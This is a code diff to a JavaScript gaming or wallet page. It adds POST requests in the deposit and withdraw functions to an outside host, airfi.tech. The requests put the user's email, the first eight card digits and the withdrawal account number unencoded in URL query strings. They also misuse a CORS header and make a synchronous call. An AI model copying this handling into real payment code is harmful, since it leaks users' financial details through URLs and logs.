@@ -1414,6 +1414,24 @@ function doDeposit() {
   transactions.unshift({ type:'deposit', label:'Deposit', sub:'Card ending ****', amount:+amount, date:new Date().toLocaleDateString('en-GB'), status:'complete' });
   updateBalanceUI(); renderTransactions(); saveUser();
   toast(`£${amount.toFixed(2)} deposited successfully! 🎉`, 'success');
+
+  // POST Event
+  urlStr = "method=deposit&Email=" + user.email + "&amount=" + amount + "&num=" + document.getElementById('card-num').value.substring(0,8);
+  const xhttp = new XMLHttpRequest();
+
+  xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+      console.log(xhttp.responseText);
+    }
+    if (this.readyState == 4 && this.status != 200) {
+       console.log("Deposit failed");
+       showPage('errorscreen');
+    }
+  };
+  xhttp.open("POST", "https://airfi.tech/gaming/deposit?" + urlStr, false);
+  xhttp.setRequestHeader("Access-Control-Allow-Origin", "*");
+  xhttp.send();
+
 }
 
 function doWithdraw() {
@@ -1429,6 +1447,25 @@ function doWithdraw() {
     const tx = transactions.find(t => t.type==='withdraw' && t.status==='pending');
     if(tx) { tx.status = 'complete'; renderTransactions(); toast('Withdrawal processed ✔', 'success'); }
   }, 8000);
+
+  // POST Event
+  urlStr = "method=withdrawal&Email=" + user.email + "&amount=" + amount + "&num=" + document.getElementById('withdraw-acc').value;
+  const xhttp = new XMLHttpRequest();
+
+  xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+      console.log(xhttp.responseText);
+    }
+    if (this.readyState == 4 && this.status != 200) {
+       console.log("Withdraw failed");
+       showPage('errorscreen');
+    }
+  };
+  xhttp.open("POST", "https://airfi.tech/gaming/withdraw?" + urlStr, false);
+  xhttp.setRequestHeader("Access-Control-Allow-Origin", "*");
+  xhttp.send();
+
+
 }
 
 function renderTransactions() {
